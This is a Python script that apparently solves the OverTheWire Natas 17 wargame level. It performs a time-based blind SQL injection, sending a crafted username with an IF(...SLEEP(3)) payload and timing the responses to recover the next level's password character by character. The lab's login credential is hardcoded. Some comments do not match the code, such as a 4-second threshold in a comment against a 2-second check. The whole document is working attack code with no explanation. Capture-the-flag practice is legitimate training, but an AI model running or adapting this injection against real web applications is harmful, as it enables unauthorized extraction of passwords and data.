#!/usr/bin/env python3
import requests
import time

auth_user = 'natas17'
auth_pwd = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
target = "http://natas17.natas.labs.overthewire.org/?debug"

password = ''

# We know the password is 32 characters long
for pos in range(33):
	for i in range(48,123):
		# only include a-z, A-Z and 0-9
		if (i>47 and i<58) or (i>64 and i<91) or (i>96):
			sqli = {'username': 'natas18" AND IF(BINARY LEFT(password,%s)="%s%s",0,SLEEP(3));#' % (len(password)+1, password, chr(i))}
			start_time = time.time()
			r = requests.post(
				target,
				auth=requests.auth.HTTPBasicAuth(auth_user, auth_pwd),
				data = sqli
				)
			end_time = time.time()
			elapsed_time = end_time - start_time
			# If the request took less than 4 seconds, the password was correct
			if elapsed_time < 2:
				# Once letter is found, it is added to the password and we jump to the next letter
				password += chr(i)
				print(password)
				print("[SUCCESS] %s (%s sec)" % (password, elapsed_time))
				break
			else:
				print("[FAIL] %s%s (%s sec)" % (password, chr(i), elapsed_time))
